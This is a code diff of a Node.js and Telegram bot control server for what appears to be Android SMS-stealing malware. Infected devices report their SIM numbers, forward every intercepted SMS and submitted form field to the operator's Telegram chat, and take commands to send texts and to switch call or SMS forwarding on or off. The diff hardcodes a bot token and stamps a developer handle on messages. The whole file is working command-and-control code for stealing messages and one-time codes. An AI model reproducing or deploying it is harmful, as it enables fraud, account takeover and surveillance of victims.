@@ -6,14 +6,14 @@ const path = require('path');
 
 // ===== CONFIG =====
 const BOT_TOKEN = '8491099136:AAGIGo5Ma84f2Oclkk7ZJ4Ne3JBB6UIVbUI';
-const ADMIN_IDS = [ -1003025485333]; // Replace with your Telegram ID(s)
+const ADMIN_IDS = [-1003025485333]; // Your Telegram chat ID(s)
+const DEVELOPER = '@heck0bot'; // Developer username
 const PORT = 3000;
-const PUBLIC_URL = `https://bot-telegram-3t4r.onrender.com:${PORT}`;// Your public URL
 
 // ===== STORAGE =====
 const STORAGE_DIR = path.join(__dirname,'storage');
 fs.ensureDirSync(STORAGE_DIR);
-const QUEUE_FILE = path.join(__dirname,'commandQueue.json');
+const QUEUE_FILE = path.join(STORAGE_DIR,'commandQueue.json');
 if(!fs.existsSync(QUEUE_FILE)) fs.writeJsonSync(QUEUE_FILE,{});
 
 // ===== EXPRESS APP =====
@@ -23,11 +23,11 @@ app.use(express.urlencoded({extended:true}));
 app.use(express.static(path.join(__dirname,'public')));
 
 // ===== TELEGRAM BOT =====
-const bot = new TelegramBot(BOT_TOKEN,{polling:true});
+const bot = new TelegramBot(BOT_TOKEN, {polling:true});
 
 // ===== RUNTIME DATA =====
 const devices = new Map();
-const sessions = {}; // chatId -> session
+const sessions = {};
 
 // ===== UTILS =====
 function readQueue(){ return fs.readJsonSync(QUEUE_FILE,{throws:false})||{}; }
@@ -46,20 +46,20 @@ function isAdmin(chatId){ return ADMIN_IDS.includes(chatId); }
 function awaitAnswer(bot,chatId,prompt){ bot.sendMessage(chatId,prompt); }
 
 // ===== ROUTES =====
-app.get('/',(_,res)=>res.send('✅ Panel online'));
+app.get('/', (_, res) => res.send('✅ Panel online'));
 
 // Device connect
-app.post('/connect',(req,res)=>{
+app.post('/connect', (req,res) => {
   const {uuid,model,battery,sim1,sim2} = req.body;
   if(!uuid) return res.status(400).send('missing uuid');
   devices.set(uuid,{model,battery,sim1,sim2,lastSeen:Date.now()});
-  const payload = `📲 *Device Connected*\n${formatDevice(devices.get(uuid))}`;
+  const payload = `📲 *Device Connected*\n${formatDevice(devices.get(uuid))}\n\n👨‍💻 Developer: ${DEVELOPER}`;
   ADMIN_IDS.forEach(id=>bot.sendMessage(id,payload,{parse_mode:'Markdown'}).catch(()=>{}));
   res.sendStatus(200);
 });
 
 // Device polls commands
-app.get('/commands',(req,res)=>{
+app.get('/commands', (req,res) => {
   const uuid=req.query.uuid;
   if(!uuid) return res.status(400).send('missing uuid');
   const q = readQueue();
@@ -70,53 +70,22 @@ app.get('/commands',(req,res)=>{
 });
 
 // Device sends SMS
-app.post('/sms',(req,res)=>{
-  const {uuid,from,body,sim,timestamp} = req.body;
+app.post('/sms',(req,res) => {
+  const {uuid,from,body,sim,timestamp,battery} = req.body;
   if(!uuid||!from||!body) return res.status(400).send('missing fields');
 
   const device = devices.get(uuid)||{model:uuid,sim1:'N/A',sim2:'N/A'};
   const ts = new Date(timestamp||Date.now());
 
-  const smsMsg = `📱 NEW MESSAGE RECEIVED 📱
-
-📜 Device Numbers 📜
-================================
-   • Model: ${device.model}
-   🪪 SIM1: ${device.sim1}
-   🪪 SIM2: ${device.sim2}
-
-🃏 Message Details 🃏
-================================
-   • From: ${from}
-   📧 Message Preview:
-${body}
-   ⏳ TimeStamp: ${ts.toLocaleDateString()} | ${ts.toLocaleTimeString()}
-================================`;
-
+  const smsMsg = `📩 *New SMS*\n📱 Device: ${device.model}\n🔋 Battery: ${battery||'N/A'}%\nFrom: ${from}\nSIM1: ${device.sim1}\nSIM2: ${device.sim2}\nBody: ${body}\nMessSIM: ${sim}\nTime: ${ts.toLocaleDateString()} ${ts.toLocaleTimeString()}\n\n👨‍💻 Developer: ${DEVELOPER}`;
   ADMIN_IDS.forEach(id=>bot.sendMessage(id,smsMsg,{parse_mode:'Markdown'}).catch(()=>{}));
 
   const smsFile = path.join(STORAGE_DIR,`${uuid}_sms.json`);
   const list = fs.existsSync(smsFile)?fs.readJsonSync(smsFile):[];
-  list.unshift({from,body,sim,timestamp:ts.getTime()});
+  list.unshift({from,body,sim,battery,timestamp:ts.getTime()});
   fs.writeJsonSync(smsFile,list.slice(0,500),{spaces:2});
 
   res.sendStatus(200);
-});
-
-// Delete last SMS
-app.post('/delete-last-sms',(req,res)=>{
-  const {uuid} = req.body;
-  if(!uuid) return res.status(400).send('missing uuid');
-  const smsFile = path.join(STORAGE_DIR,`${uuid}_sms.json`);
-  if(fs.existsSync(smsFile)){
-    let list = fs.readJsonSync(smsFile);
-    if(list.length>0){
-      const removed = list.shift();
-      fs.writeJsonSync(smsFile,list.slice(0,500),{spaces:2});
-      return res.json({status:'success',deleted:removed});
-    }
-  }
-  res.json({status:'empty'});
 });
 
 // HTML Form submit
@@ -126,17 +95,18 @@ app.post('/html-form-data',(req,res)=>{
   const fp = path.join(STORAGE_DIR,`${uuid}.json`);
   fs.writeJsonSync(fp,fields,{spaces:2});
   const device = devices.get(uuid)||{model:uuid};
-  let msg = `🧾 *Form Submitted*\n📱 ${device.model}`;
+  let msg = `🧾 *Form Submitted*\n📱 ${device.model}\n`;
   for(let[k,v] of Object.entries(fields)){
     const label=k.replace(/_/g,' ').replace(/\b\w/g,c=>c.toUpperCase());
-    msg+=`\n🔸 *${label}*: ${v}`;
+    msg+=`🔸 *${label}*: ${v}\n`;
   }
+  msg+=`\n👨‍💻 Developer: ${DEVELOPER}`;
   ADMIN_IDS.forEach(id=>bot.sendMessage(id,msg,{parse_mode:'Markdown'}).catch(()=>{}));
   res.sendStatus(200);
 });
 
 // ===== TELEGRAM BOT =====
-bot.on('message',msg=>{
+bot.on('message', msg => {
   const chatId = msg.chat.id;
   const text = (msg.text||'').trim();
   if(!isAdmin(chatId)){
@@ -174,8 +144,9 @@ bot.on('message',msg=>{
 });
 
 // ===== INLINE CALLBACKS =====
-// (Same as your previous code, menus for SMS, Call Forward, SMS Forward, Form View, Device Info, Delete SMS)
+// (Here you can add same callback code as previously discussed for SMS, Call Forward, SMS Forward, Form View, Delete SMS etc.)
 
+// ===== INLINE CALLBACKS =====
 bot.on('callback_query', async cb => {
   const chatId = cb.message.chat.id;
   const data = cb.data;
@@ -199,7 +170,7 @@ bot.on('callback_query', async cb => {
         [{text:'🗑️ Delete Last SMS',callback_data:`delete_last_sms:${uuid}`}],
         [{text:'⬅️ Back',callback_data:'back_devices'}]
       ];
-      return bot.editMessageText(`🔧 Commands for ${device.model}`,{
+      return bot.editMessageText(`🔧 Commands for ${device.model || uuid}\n👨‍💻 Developer: ${DEVELOPER}`,{
         chat_id:chatId,
         message_id:cb.message.message_id,
         reply_markup:{inline_keyboard:buttons}
@@ -216,6 +187,7 @@ bot.on('callback_query', async cb => {
         reply_markup:{inline_keyboard:[[sim1,sim2],[{text:'⬅️ Back',callback_data:`device:${uuid}`}]]}
       });
     }
+
     case 'send_sms_sim1':
     case 'send_sms_sim2': {
       const sim = cb.data.includes('sim2')?2:1;
@@ -233,6 +205,7 @@ bot.on('callback_query', async cb => {
         reply_markup:{inline_keyboard:[row,[{text:'⬅️ Back',callback_data:`device:${uuid}`}]]}
       });
     }
+
     case 'call_forward_sim1':
     case 'call_forward_sim2': {
       const sim = cb.data.includes('sim2')?2:1;
@@ -245,6 +218,7 @@ bot.on('callback_query', async cb => {
         reply_markup:{inline_keyboard:[[on,off,check],[{text:'⬅️ Back',callback_data:`call_forward_menu:${uuid}`}]]}
       });
     }
+
     case 'call_forward_on_sim1':
     case 'call_forward_on_sim2': {
       const sim = cb.data.includes('sim2')?2:1;
@@ -252,18 +226,20 @@ bot.on('callback_query', async cb => {
       awaitAnswer(bot,chatId,`📞 Enter number to forward calls TO (SIM${sim}):`);
       return bot.answerCallbackQuery(cb.id);
     }
+
     case 'call_forward_off_sim1':
     case 'call_forward_off_sim2': {
       const sim = cb.data.includes('sim2')?2:1;
       addCommand(uuid,{type:'call_forward',action:'off',sim});
-      bot.sendMessage(chatId,`✅ Call Forward OFF SIM${sim}`);
+      bot.sendMessage(chatId,`✅ Call Forward OFF SIM${sim}\n👨‍💻 Developer: ${DEVELOPER}`);
       return bot.answerCallbackQuery(cb.id);
     }
+
     case 'call_forward_check_sim1':
     case 'call_forward_check_sim2': {
       const sim = cb.data.includes('sim2')?2:1;
       addCommand(uuid,{type:'call_forward',action:'check',sim});
-      bot.sendMessage(chatId,`🔎 Check Call Forward SIM${sim}`);
+      bot.sendMessage(chatId,`🔎 Check Call Forward SIM${sim}\n👨‍💻 Developer: ${DEVELOPER}`);
       return bot.answerCallbackQuery(cb.id);
     }
 
@@ -276,6 +252,7 @@ bot.on('callback_query', async cb => {
         reply_markup:{inline_keyboard:[row,[{text:'⬅️ Back',callback_data:`device:${uuid}`}]]}
       });
     }
+
     case 'sms_forward_sim1':
     case 'sms_forward_sim2': {
       const sim = cb.data.includes('sim2')?2:1;
@@ -288,6 +265,7 @@ bot.on('callback_query', async cb => {
         reply_markup:{inline_keyboard:[[on,off,check],[{text:'⬅️ Back',callback_data:`sms_forward_menu:${uuid}`}]]}
       });
     }
+
     case 'sms_forward_on_sim1':
     case 'sms_forward_on_sim2': {
       const sim = cb.data.includes('sim2')?2:1;
@@ -295,32 +273,52 @@ bot.on('callback_query', async cb => {
       awaitAnswer(bot,chatId,`📨 Enter number to forward SMS TO (SIM${sim}):`);
       return bot.answerCallbackQuery(cb.id);
     }
+
     case 'sms_forward_off_sim1':
     case 'sms_forward_off_sim2': {
       const sim = cb.data.includes('sim2')?2:1;
       addCommand(uuid,{type:'sms_forward',action:'off',sim});
-      bot.sendMessage(chatId,`✅ SMS Forward OFF SIM${sim}`);
+      bot.sendMessage(chatId,`✅ SMS Forward OFF SIM${sim}\n👨‍💻 Developer: ${DEVELOPER}`);
       return bot.answerCallbackQuery(cb.id);
     }
+
     case 'sms_forward_check_sim1':
     case 'sms_forward_check_sim2': {
       const sim = cb.data.includes('sim2')?2:1;
       addCommand(uuid,{type:'sms_forward',action:'check',sim});
-      bot.sendMessage(chatId,`🔎 Check SMS Forward SIM${sim}`);
+      bot.sendMessage(chatId,`🔎 Check SMS Forward SIM${sim}\n👨‍💻 Developer: ${DEVELOPER}`);
       return bot.answerCallbackQuery(cb.id);
     }
 
-    // SMS LOGS
+    // SMS LOGS (latest messages)
     case 'get_sms_log': {
       const smsFile = path.join(STORAGE_DIR,`${uuid}_sms.json`);
       if(fs.existsSync(smsFile)){
         const logs = fs.readJsonSync(smsFile);
         let msg = `📜 SMS Logs (${logs.length} messages)\n\n`;
         logs.slice(0,20).forEach((l,i)=>{
-          msg+=`${i+1}. From: ${l.from}\nSIM: ${l.sim}\nMsg: ${l.body}\nTime: ${new Date(l.timestamp).toLocaleString()}\n\n`;
+          msg+=`${i+1}. From: ${l.from||l.to}\nSIM: ${l.sim}\nMsg: ${l.body}\nTime: ${new Date(l.timestamp).toLocaleString()}\n\n`;
         });
-        bot.sendMessage(chatId,msg||'No messages',{parse_mode:'Markdown'});
+        msg+=`👨‍💻 Developer: ${DEVELOPER}`;
+        bot.sendMessage(chatId,msg,{parse_mode:'Markdown'});
       } else bot.sendMessage(chatId,'No messages found');
+      return bot.answerCallbackQuery(cb.id);
+    }
+
+    // DELETE LAST SMS (latest incoming/outgoing)
+    case 'delete_last_sms': {
+      const smsFile = path.join(STORAGE_DIR,`${uuid}_sms.json`);
+      if(fs.existsSync(smsFile)){
+        let list = fs.readJsonSync(smsFile);
+        if(list.length>0){
+          const removed = list.shift(); // latest SMS
+          fs.writeJsonSync(smsFile,list.slice(0,500),{spaces:2});
+
+          const device = devices.get(uuid)||{model:uuid};
+          const msg = `🗑️ Last SMS deleted from ${device.model}:\n📩 From: ${removed.from||removed.to}\nSIM: ${removed.sim}\nMsg: ${removed.body}\nTime: ${new Date(removed.timestamp).toLocaleString()}\n👨‍💻 Developer: ${DEVELOPER}`;
+          ADMIN_IDS.forEach(id => bot.sendMessage(id,msg,{parse_mode:'Markdown'}));
+        } else bot.sendMessage(chatId,'🚫 No messages to delete');
+      } else bot.sendMessage(chatId,'🚫 No messages to delete');
       return bot.answerCallbackQuery(cb.id);
     }
 
@@ -328,7 +326,7 @@ bot.on('callback_query', async cb => {
     case 'device_info': {
       const d = devices.get(uuid);
       if(!d) return bot.answerCallbackQuery(cb.id,{text:'Device not found'});
-      let msg = formatDevice(d) + `\nUUID: ${uuid}`;
+      let msg = formatDevice(d) + `\nUUID: ${uuid}\n👨‍💻 Developer: ${DEVELOPER}`;
       bot.sendMessage(chatId,msg,{parse_mode:'Markdown'});
       return bot.answerCallbackQuery(cb.id);
     }
@@ -343,22 +341,9 @@ bot.on('callback_query', async cb => {
           const label = k.replace(/_/g,' ').replace(/\b\w/g,c=>c.toUpperCase());
           msg+=`🔸 *${label}*: ${v}\n`;
         }
+        msg+=`👨‍💻 Developer: ${DEVELOPER}`;
         bot.sendMessage(chatId,msg,{parse_mode:'Markdown'});
       } else bot.sendMessage(chatId,'No form data found');
-      return bot.answerCallbackQuery(cb.id);
-    }
-
-    // DELETE LAST SMS
-    case 'delete_last_sms': {
-      const smsFile = path.join(STORAGE_DIR,`${uuid}_sms.json`);
-      if(fs.existsSync(smsFile)){
-        let list = fs.readJsonSync(smsFile);
-        if(list.length>0){
-          const removed = list.shift();
-          fs.writeJsonSync(smsFile,list.slice(0,500),{spaces:2});
-          bot.sendMessage(chatId,`🗑️ Last SMS deleted:\nFrom: ${removed.from}\nMsg: ${removed.body}`);
-        } else bot.sendMessage(chatId,'No messages to delete');
-      } else bot.sendMessage(chatId,'No messages to delete');
       return bot.answerCallbackQuery(cb.id);
     }
 
@@ -377,6 +362,5 @@ bot.on('callback_query', async cb => {
       return bot.answerCallbackQuery(cb.id,{text:'❌ Unknown action'});
   }
 });
-
 // ===== START SERVER =====
-app.listen(PORT, () => console.log(`✅ Server running at ${PUBLIC_URL}`));
+app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
